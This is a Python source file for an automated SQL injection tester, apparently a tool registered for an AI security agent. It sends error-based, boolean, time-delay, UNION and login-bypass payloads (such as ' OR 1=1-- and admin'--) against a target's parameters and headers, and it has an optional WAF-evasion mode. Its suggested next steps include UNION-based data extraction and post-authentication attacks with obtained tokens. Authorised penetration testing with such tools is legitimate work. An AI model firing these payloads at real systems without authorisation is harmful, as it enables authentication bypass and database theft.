"""Python-native SQL injection tester.

Implements the "20% that finds 80% of SQLi" -- 4-phase detection:
1. Error-Based: Trigger SQL error messages
2. Boolean-Based: Compare true/false condition responses
3. Time-Based: Inject SLEEP payloads, measure delay
4. UNION-Based: Determine column count, attempt UNION SELECT
"""

from __future__ import annotations

import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

logger = logging.getLogger("security_mcp.scanners.sqli_tester")

# ---------------------------------------------------------------------------
# Error signatures by DBMS
# ---------------------------------------------------------------------------

DBMS_ERROR_SIGNATURES: dict[str, list[str]] = {
    "MySQL": [
        r"You have an error in your SQL syntax",
        r"Warning.*mysql_",
        r"mysql_fetch",
        r"MySQLSyntaxErrorException",
        r"com\.mysql\.jdbc",
        r"Unclosed quotation mark.*MySQL",
    ],
    "PostgreSQL": [
        r"ERROR:\s+syntax error",
        r"pg_query\(\)",
        r"unterminated quoted string",
        r"PSQLException",
        r"org\.postgresql",
    ],
    "SQLite": [
        r"SQLITE_ERROR",
        r"SQLite3::SQLException",
        r"unrecognized token",
        r"sqlite3\.OperationalError",
    ],
    "MSSQL": [
        r"Unclosed quotation mark",
        r"mssql_query\(\)",
        r"Microsoft SQL Native Client",
        r"ODBC SQL Server Driver",
        r"SqlException",
        r"System\.Data\.SqlClient",
    ],
    "Oracle": [
        r"ORA-\d{5}",
        r"oracle\.jdbc",
        r"quoted string not properly terminated",
    ],
}

# ---------------------------------------------------------------------------
# Payload definitions
# ---------------------------------------------------------------------------

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "1' OR '1'='1'--",
    '" OR ""="',
    "' UNION SELECT NULL--",
    "1;--",
]

# Boolean-based payload pairs (true_condition, false_condition)
BOOLEAN_PAIRS = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR '1'='1'--", "' OR '1'='2'--"),
    ("1) AND (1=1", "1) AND (1=2"),
]

# Time-based payloads (dbms, payload, expected_delay_seconds)
TIME_PAYLOADS: list[tuple[str, str, int]] = [
    ("MySQL", "' OR SLEEP(5)-- -", 5),
    ("MySQL", "1' AND SLEEP(5)-- -", 5),
    ("PostgreSQL", "'; SELECT pg_sleep(5)--", 5),
    ("MSSQL", "'; WAITFOR DELAY '0:0:5'--", 5),
    ("Oracle", "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
    # Stacked queries -- test for multi-statement support
    ("MySQL", "'; SELECT SLEEP(5);--", 5),
    ("PostgreSQL", "'; SELECT pg_sleep(5);--", 5),
    ("MSSQL", "'; WAITFOR DELAY '0:0:5';--", 5),
]

# Time tolerance: flag if response > (expected_delay - tolerance)
TIME_TOLERANCE = 0.5

# UNION-based: max columns to probe when determining column count
UNION_MAX_COLUMNS = 20

# UNION marker used to detect successful injection in response body
UNION_MARKER = "security_mcp_sqli_marker_7x9k2"

# ---------------------------------------------------------------------------
# Auth-bypass detection constants
# ---------------------------------------------------------------------------

AUTH_BYPASS_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1'--",
    "admin'--",
    "' OR 1=1#",
    "') OR ('1'='1'--",
    "' OR 1=1-- -",
]

# Parameter names that indicate an authentication field
AUTH_PARAM_NAMES = {"email", "username", "user", "login", "uname", "name", "account", "uid"}

# Keywords that appear in successful auth responses but not in failed ones
AUTH_SUCCESS_INDICATORS = ["token", "jwt", "session", "bearer", "logged", "authentication", "authorized"]


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------


@dataclass
class SQLiVulnerability:
    """A single SQLi finding."""

    param: str
    location: str  # GET, POST, COOKIE, HEADER
    technique: str  # error_based, boolean_based, time_based, union_based
    dbms: str = "Unknown"
    evidence: str = ""
    payload: str = ""
    confidence: float = 0.5


@dataclass
class SQLiResult:
    """Complete SQLi test result."""

    target: str
    vulnerable: bool = False
    vulnerabilities: list[SQLiVulnerability] = field(default_factory=list)
    params_tested: int = 0
    duration_ms: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        """Serialize to dictionary for JSON output."""
        return {
            "target": self.target,
            "vulnerable": self.vulnerable,
            "vulnerabilities": [
                {
                    "param": v.param,
                    "location": v.location,
                    "technique": v.technique,
                    "dbms": v.dbms,
                    "evidence": v.evidence,
                    "payload": v.payload,
                    "confidence": v.confidence,
                }
                for v in self.vulnerabilities
            ],
            "params_tested": self.params_tested,
            "duration_ms": self.duration_ms,
            "summary": (
                f"{len(self.vulnerabilities)} SQL injection "
                f"{'vulnerability' if len(self.vulnerabilities) == 1 else 'vulnerabilities'} "
                f"found ({', '.join(v.technique for v in self.vulnerabilities)})"
                if self.vulnerabilities
                else "No SQL injection found"
            ),
            "next_steps": self._next_steps(),
        }

    def _next_steps(self) -> list[str]:
        steps: list[str] = []
        if self.vulnerabilities:
            techniques = {v.technique for v in self.vulnerabilities}
            if "error_based" in techniques or "union_based" in techniques:
                steps.append("Use http_request for UNION-based data extraction")
            if "auth_bypass" in techniques:
                steps.append("Decode obtained JWT token and run plan(action='post_auth')")
            steps.append("Run injection_test on related endpoints")
        return steps


# ---------------------------------------------------------------------------
# 4-phase SQL injection engine
# ---------------------------------------------------------------------------


class PythonSQLiTester:
    """4-phase SQL injection detection engine.

    Phases run in order per parameter, short-circuiting on first confirmed
    vulnerability for each param:
        1. Error-Based  (fastest, most reliable)
        2. Boolean-Based (response diff analysis)
        3. Time-Based   (slow, last resort for blind SQLi)
        4. UNION-Based  (column count probe + marker extraction)
    """

    def __init__(
        self,
        timeout: float = 15.0,
        extra_headers: dict[str, str] | None = None,
        waf_evasion: bool = False,
    ) -> None:
        self.timeout = timeout
        self._extra_headers = extra_headers or {}
        self._waf_evasion = waf_evasion

    async def test(
        self,
        url: str,
        params: list[str] | None = None,
        method: str = "GET",
        body: dict[str, str] | None = None,
        content_type: str = "form",
    ) -> SQLiResult:
        """Run SQL injection tests on the target.

        Args:
            url: Target URL (with or without query params).
            params: Specific parameters to test. ``None`` = auto-detect from URL/body.
            method: HTTP method (GET or POST).
            body: POST body parameters (for POST method).
            content_type: Body encoding — ``"form"`` or ``"json"``.

        Returns:
            ``SQLiResult`` with all discovered vulnerabilities.
        """
        start = time.monotonic()
        result = SQLiResult(target=url)

        # Auto-detect parameters
        test_params = self._detect_params(url, params, method, body)
        result.params_tested = len(test_params)

        if not test_params:
            logger.warning("No testable parameters found for %s", url)
            result.duration_ms = (time.monotonic() - start) * 1000
            return result

        async with httpx.AsyncClient(
            timeout=self.timeout, follow_redirects=True, verify=False, headers=self._extra_headers,
        ) as client:
            # Fetch baseline response for boolean/union comparison
            baseline = await self._get_baseline(client, url, method, body)

            for param_name, location in test_params:
                # Phase 0: Auth-bypass (only for auth-related POST params)
                if location == "POST" and param_name.lower() in AUTH_PARAM_NAMES:
                    vuln = await self._test_auth_bypass(client, url, param_name, location, method, body, content_type)
                    if vuln:
                        result.vulnerabilities.append(vuln)
                        result.vulnerable = True
                        continue  # Skip other phases for this param

                # Phase 1: Error-based
                vuln = await self._test_error_based(client, url, param_name, location, method, body, content_type)
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True
                    continue  # Skip other phases for this param

                # Phase 2: Boolean-based
                vuln = await self._test_boolean_based(client, url, param_name, location, method, body, content_type)
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True
                    continue

                # Phase 3: Time-based (slower, only if others didn't find it)
                vuln = await self._test_time_based(client, url, param_name, location, method, body, content_type)
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True
                    continue

                # Phase 4: UNION-based (column count probe)
                vuln = await self._test_union_based(
                    client, url, param_name, location, method, body, baseline, content_type
                )
                if vuln:
                    result.vulnerabilities.append(vuln)
                    result.vulnerable = True

            # Phase 5: Header injection (runs once regardless of params)
            header_vuln = await self._test_header_injection(client, url)
            if header_vuln:
                result.vulnerabilities.append(header_vuln)
                result.vulnerable = True

        result.duration_ms = (time.monotonic() - start) * 1000
        logger.info(
            "SQLi test complete for %s — %d params, %d vulns, %.0fms",
            url,
            result.params_tested,
            len(result.vulnerabilities),
            result.duration_ms,
        )
        return result

    # ------------------------------------------------------------------
    # Parameter detection
    # ------------------------------------------------------------------

    def _detect_params(
        self,
        url: str,
        explicit_params: list[str] | None,
        method: str,
        body: dict[str, str] | None,
    ) -> list[tuple[str, str]]:
        """Detect testable parameters from URL and body.

        Returns a list of ``(param_name, location)`` tuples where
        location is ``"GET"`` or ``"POST"``.
        """
        params: list[tuple[str, str]] = []

        # GET params from URL query string
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        for p in query_params:
            params.append((p, "GET"))

        # POST body params
        if body:
            for p in body:
                params.append((p, "POST"))

        # Filter to explicit params if specified
        if explicit_params:
            params = [(p, loc) for p, loc in params if p in explicit_params]

        return params

    # ------------------------------------------------------------------
    # HTTP helpers
    # ------------------------------------------------------------------

    async def _get_baseline(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        body: dict[str, str] | None,
    ) -> httpx.Response | None:
        """Fetch baseline (unmodified) response for comparison."""
        try:
            if method.upper() == "POST" and body:
                return await client.post(url, data=body)
            return await client.get(url)
        except httpx.HTTPError:
            return None

    # ------------------------------------------------------------------
    # Phase 0: Auth-bypass detection
    # ------------------------------------------------------------------

    async def _test_auth_bypass(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
        content_type: str = "form",
    ) -> SQLiVulnerability | None:
        """Phase 0: Detect SQL injection that bypasses authentication.

        For POST endpoints with auth-related parameters (email, username, etc.),
        first obtains a baseline response with a normal value, then injects
        auth-bypass payloads (``' OR 1=1--``, etc.) and checks for:

        1. **Status upgrade**: baseline 401/403/500 → injected 200
        2. **Auth token appearance**: response contains JWT/session/token
           keywords that were absent from the baseline

        This phase catches login-bypass SQLi where the successful injection
        returns a valid authentication response rather than an SQL error.
        """
        # Get a baseline with a benign value
        baseline = await self._send_with_payload(
            client, url, param, "baseline_test_value@example.com", location, method, body, content_type
        )
        if baseline is None:
            return None

        baseline_status = baseline.status_code
        baseline_lower = baseline.text.lower()

        for payload in AUTH_BYPASS_PAYLOADS:
            resp = await self._send_with_payload(client, url, param, payload, location, method, body, content_type)
            if resp is None:
                continue

            resp_lower = resp.text.lower()

            # Check 1: Status code upgrade (failure → success)
            status_upgrade = baseline_status in (401, 403, 500) and resp.status_code == 200

            # Check 2: Auth token appears in response (absent from baseline)
            new_auth_indicators = [
                kw for kw in AUTH_SUCCESS_INDICATORS if kw in resp_lower and kw not in baseline_lower
            ]

            if status_upgrade or (resp.status_code == 200 and new_auth_indicators):
                evidence_parts = []
                if status_upgrade:
                    evidence_parts.append(f"Status changed from {baseline_status} to {resp.status_code}")
                if new_auth_indicators:
                    evidence_parts.append(f"Auth indicators appeared: {', '.join(new_auth_indicators)}")
                logger.info(
                    "Phase 0 HIT: auth_bypass on param=%s payload=%s",
                    param,
                    payload,
                )
                return SQLiVulnerability(
                    param=param,
                    location=location,
                    technique="auth_bypass",
                    dbms="Unknown",
                    evidence=". ".join(evidence_parts),
                    payload=payload,
                    confidence=0.8,
                )

        return None

    # ------------------------------------------------------------------
    # HTTP helpers
    # ------------------------------------------------------------------

    async def _send_with_payload(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        payload: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
        content_type: str = "form",
    ) -> httpx.Response | None:
        """Send a request with the payload injected into the specified parameter."""
        try:
            if location == "GET":
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query, keep_blank_values=True)
                query_params[param] = [payload]
                new_query = urlencode(query_params, doseq=True)
                injected_url = urlunparse(parsed._replace(query=new_query))
                return await client.get(injected_url)
            else:  # POST
                injected_body = dict(body or {})
                injected_body[param] = payload
                if content_type == "json":
                    return await client.post(
                        url,
                        json=injected_body,
                        headers={**self._extra_headers, "Content-Type": "application/json"},
                    )
                return await client.post(
                    url,
                    data=injected_body,
                    headers={**self._extra_headers, "Content-Type": "application/x-www-form-urlencoded"},
                )
        except httpx.HTTPError as exc:
            logger.debug("HTTP error injecting param=%s payload=%s: %s", param, payload[:50], exc)
            return None

    # ------------------------------------------------------------------
    # Phase 1: Error-based detection
    # ------------------------------------------------------------------

    async def _test_error_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
        content_type: str = "form",
    ) -> SQLiVulnerability | None:
        """Phase 1: Trigger SQL error messages in response body."""
        payloads = list(ERROR_PAYLOADS)
        if self._waf_evasion:
            from security_mcp.scanners._encoder import PayloadEncoder

            expanded: list[str] = []
            for p in payloads:
                expanded.append(p)
                expanded.extend(PayloadEncoder.sql_variants(p))
            payloads = list(dict.fromkeys(expanded))  # dedupe, preserve order

        for payload in payloads:
            resp = await self._send_with_payload(client, url, param, payload, location, method, body, content_type)
            if resp is None:
                continue

            response_text = resp.text
            for dbms, signatures in DBMS_ERROR_SIGNATURES.items():
                for sig_pattern in signatures:
                    match = re.search(sig_pattern, response_text, re.IGNORECASE)
                    if match:
                        logger.info(
                            "Phase 1 HIT: %s error on param=%s dbms=%s",
                            "error_based",
                            param,
                            dbms,
                        )
                        return SQLiVulnerability(
                            param=param,
                            location=location,
                            technique="error_based",
                            dbms=dbms,
                            evidence=match.group(0)[:200],
                            payload=payload,
                            confidence=0.8,
                        )
        return None

    # ------------------------------------------------------------------
    # Phase 2: Boolean-based blind detection
    # ------------------------------------------------------------------

    async def _test_boolean_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
        content_type: str = "form",
    ) -> SQLiVulnerability | None:
        """Phase 2: Compare true/false condition responses.

        A significant difference in response length (>10%) between
        a tautology (``1=1``) and a contradiction (``1=2``) indicates
        the SQL condition is being evaluated server-side.
        """
        boolean_pairs = list(BOOLEAN_PAIRS)
        if self._waf_evasion:
            from security_mcp.scanners._encoder import PayloadEncoder

            expanded_pairs: list[tuple[str, str]] = []
            for true_p, false_p in boolean_pairs:
                expanded_pairs.append((true_p, false_p))
                for tv in PayloadEncoder.sql_variants(true_p):
                    for fv in PayloadEncoder.sql_variants(false_p):
                        if (tv, fv) != (true_p, false_p):
                            expanded_pairs.append((tv, fv))
            # dedupe, preserve order
            seen: set[tuple[str, str]] = set()
            deduped: list[tuple[str, str]] = []
            for pair in expanded_pairs:
                if pair not in seen:
                    seen.add(pair)
                    deduped.append(pair)
            boolean_pairs = deduped

        for true_payload, false_payload in boolean_pairs:
            true_resp = await self._send_with_payload(
                client, url, param, true_payload, location, method, body, content_type
            )
            false_resp = await self._send_with_payload(
                client, url, param, false_payload, location, method, body, content_type
            )
            if true_resp is None or false_resp is None:
                continue

            # Compare responses
            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            # Significant difference: >10% body length change AND different content
            if true_len > 0 and false_len > 0:
                diff_ratio = abs(true_len - false_len) / max(true_len, false_len)
                if diff_ratio > 0.10 and true_resp.text != false_resp.text:
                    logger.info(
                        "Phase 2 HIT: boolean_based on param=%s diff=%.1f%%",
                        param,
                        diff_ratio * 100,
                    )
                    return SQLiVulnerability(
                        param=param,
                        location=location,
                        technique="boolean_based",
                        evidence=(
                            f"True response: {true_len} bytes, "
                            f"False response: {false_len} bytes "
                            f"(diff: {diff_ratio:.1%})"
                        ),
                        payload=true_payload,
                        confidence=0.6,
                    )
        return None

    # ------------------------------------------------------------------
    # Phase 3: Time-based blind detection
    # ------------------------------------------------------------------

    async def _test_time_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
        content_type: str = "form",
    ) -> SQLiVulnerability | None:
        """Phase 3: Inject SLEEP payloads, measure response time.

        If the server delays by approximately the expected amount, the
        injected SQL sleep statement is being executed.
        """
        for dbms, payload, expected_delay in TIME_PAYLOADS:
            start = time.monotonic()
            resp = await self._send_with_payload(client, url, param, payload, location, method, body, content_type)
            elapsed = time.monotonic() - start

            if resp is not None and elapsed >= (expected_delay - TIME_TOLERANCE):
                # Double verification: send a sleep(0) control to rule out
                # network latency.  If the control also takes ~5s, it's not SQLi.
                control_payload = payload.replace("5", "0").replace("'0:0:0'", "'0:0:0'")
                ctrl_start = time.monotonic()
                ctrl_resp = await self._send_with_payload(
                    client, url, param, control_payload, location, method, body, content_type,
                )
                ctrl_elapsed = time.monotonic() - ctrl_start

                if ctrl_resp is not None and ctrl_elapsed >= (expected_delay - TIME_TOLERANCE):
                    # Control also slow → network latency, not SQLi
                    logger.debug(
                        "Phase 3 SKIP: control also slow (%.1fs) for param=%s",
                        ctrl_elapsed,
                        param,
                    )
                    continue

                logger.info(
                    "Phase 3 HIT: time_based on param=%s dbms=%s elapsed=%.1fs (control=%.1fs)",
                    param,
                    dbms,
                    elapsed,
                    ctrl_elapsed,
                )
                return SQLiVulnerability(
                    param=param,
                    location=location,
                    technique="time_based",
                    dbms=dbms,
                    evidence=(
                        f"Response delayed {elapsed:.1f}s (control {ctrl_elapsed:.1f}s, "
                        f"expected >={expected_delay - TIME_TOLERANCE}s). Double-verified."
                    ),
                    payload=payload,
                    confidence=0.8,
                )
        return None

    # ------------------------------------------------------------------
    # Phase 4: UNION-based detection
    # ------------------------------------------------------------------

    async def _test_union_based(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
        baseline: httpx.Response | None,
        content_type: str = "form",
    ) -> SQLiVulnerability | None:
        """Phase 4: Determine column count via ORDER BY, then UNION SELECT.

        1. Probe column count with ``ORDER BY N`` (binary-search style).
        2. Once column count is known, attempt ``UNION SELECT`` with a
           unique marker string to confirm data extraction.
        """
        # Step 1: Determine column count via ORDER BY
        col_count = await self._probe_column_count(client, url, param, location, method, body, content_type)
        if col_count is None:
            return None

        # Step 2: Attempt UNION SELECT with marker
        columns = [f"'{UNION_MARKER}'" if i == 0 else "NULL" for i in range(col_count)]
        union_payload = f"' UNION SELECT {','.join(columns)}-- -"

        resp = await self._send_with_payload(client, url, param, union_payload, location, method, body, content_type)
        if resp is not None and UNION_MARKER in resp.text:
            logger.info(
                "Phase 4 HIT: union_based on param=%s columns=%d",
                param,
                col_count,
            )
            return SQLiVulnerability(
                param=param,
                location=location,
                technique="union_based",
                evidence=f"UNION SELECT successful with {col_count} columns, marker reflected",
                payload=union_payload,
                confidence=1.0,
            )

        # Fallback: if ORDER BY worked but UNION didn't reflect the marker,
        # the ORDER BY success alone is a strong indicator.
        if col_count > 0:
            logger.info(
                "Phase 4 partial: ORDER BY succeeded (cols=%d) but marker not reflected for param=%s",
                col_count,
                param,
            )

        return None

    async def _probe_column_count(
        self,
        client: httpx.AsyncClient,
        url: str,
        param: str,
        location: str,
        method: str,
        body: dict[str, str] | None,
        content_type: str = "form",
    ) -> int | None:
        """Probe column count using ``ORDER BY N``.

        Returns the number of columns if determinable, else ``None``.
        The technique sends ``ORDER BY 1``, ``ORDER BY 2``, ... until
        the response changes (error or different status code), indicating
        the column count has been exceeded.
        """
        last_ok_status: int | None = None

        for n in range(1, UNION_MAX_COLUMNS + 1):
            payload = f"' ORDER BY {n}-- -"
            resp = await self._send_with_payload(client, url, param, payload, location, method, body, content_type)
            if resp is None:
                return None

            if n == 1:
                last_ok_status = resp.status_code
                continue

            # If status code changed or response contains a SQL error,
            # the previous N was the column count.
            status_changed = resp.status_code != last_ok_status
            has_error = any(
                re.search(sig, resp.text, re.IGNORECASE) for sigs in DBMS_ERROR_SIGNATURES.values() for sig in sigs
            )

            if status_changed or has_error:
                return n - 1

            last_ok_status = resp.status_code

        return None

    # ------------------------------------------------------------------
    # Phase 5: Header injection (Cookie, Referer, X-Forwarded-For)
    # ------------------------------------------------------------------

    _HEADER_TARGETS = ["Cookie", "Referer", "X-Forwarded-For"]

    async def _test_header_injection(
        self,
        client: httpx.AsyncClient,
        url: str,
    ) -> SQLiVulnerability | None:
        """Phase 5: Inject error-triggering payloads into HTTP headers.

        Many apps log or process Cookie, Referer, and X-Forwarded-For
        values through SQL queries without parameterisation.
        """
        for header_name in self._HEADER_TARGETS:
            for payload in ("'", "' OR '1'='1", "1' AND SLEEP(0)-- -"):
                try:
                    resp = await client.get(url, headers={header_name: payload})
                except httpx.HTTPError:
                    continue
                if resp is None:
                    continue
                for dbms, sigs in DBMS_ERROR_SIGNATURES.items():
                    for sig in sigs:
                        if re.search(sig, resp.text, re.IGNORECASE):
                            logger.info(
                                "Phase 5 HIT: header injection via %s, dbms=%s",
                                header_name,
                                dbms,
                            )
                            return SQLiVulnerability(
                                param=header_name,
                                location="HEADER",
                                technique="error_based",
                                dbms=dbms,
                                evidence=(
                                    f"SQL error triggered via {header_name} header. "
                                    f"Pattern: {sig}"
                                ),
                                payload=payload,
                                confidence=0.8,
                            )
        return None


# ---------------------------------------------------------------------------
# Tool wrapper for ToolRegistry
# ---------------------------------------------------------------------------


async def python_sqli_test(
    url: str,
    params: str | None = None,
    method: str = "GET",
    body: str | None = None,
    content_type: str = "form",
    headers: str = "",
    waf_evasion: bool = False,
) -> str:
    """Run SQL injection tests against a URL.

    Args:
        url: Target URL with query parameters to test.
        params: Comma-separated parameter names. Auto-detect if omitted.
        method: HTTP method (GET or POST).
        body: Request body as string. For JSON APIs, pass a JSON string
            like ``'{"email": "test", "password": "test"}'``.
            Used with ``method=POST``.
        content_type: Body encoding — ``"form"``
            (application/x-www-form-urlencoded) or ``"json"``
            (application/json). Default: ``"form"``.
            Also accepts ``"application/json"`` and
            ``"application/x-www-form-urlencoded"`` (normalized automatically).
        headers: JSON string of extra HTTP headers for authenticated testing,
            e.g. ``'{"Authorization": "Bearer token123"}'``. Default: ``""``.
        waf_evasion: Enable WAF bypass encoding for payloads. Default: ``False``.

    Returns:
        JSON string with ``SQLiResult`` data.
    """
    param_list = params.split(",") if params else None
    extra_headers: dict[str, str] = json.loads(headers) if headers else {}

    # Normalize content_type: accept both short ("json") and MIME ("application/json") forms
    ct = content_type.lower().strip()
    if "json" in ct:
        ct = "json"
    elif "form" in ct or "urlencoded" in ct:
        ct = "form"
    else:
        ct = content_type  # pass through unknown values as-is

    # Parse body string into dict for the tester
    parsed_body: dict[str, str] | None = None
    if body is not None:
        if ct == "json":
            try:
                parsed_body = json.loads(body)
            except json.JSONDecodeError as exc:
                result = SQLiResult(target=url)
                result.duration_ms = 0.0
                error_dict = result.to_dict()
                error_dict["error"] = f"Invalid JSON body: {exc}"
                return json.dumps(error_dict, indent=2)
        else:
            # Parse as form-encoded: "key1=val1&key2=val2"
            from urllib.parse import parse_qs as _parse_qs

            parsed = _parse_qs(body, keep_blank_values=True)
            parsed_body = {k: v[0] for k, v in parsed.items()}

    tester = PythonSQLiTester(extra_headers=extra_headers, waf_evasion=waf_evasion)
    result = await tester.test(url, params=param_list, method=method, body=parsed_body, content_type=ct)
    return json.dumps(result.to_dict(), indent=2)
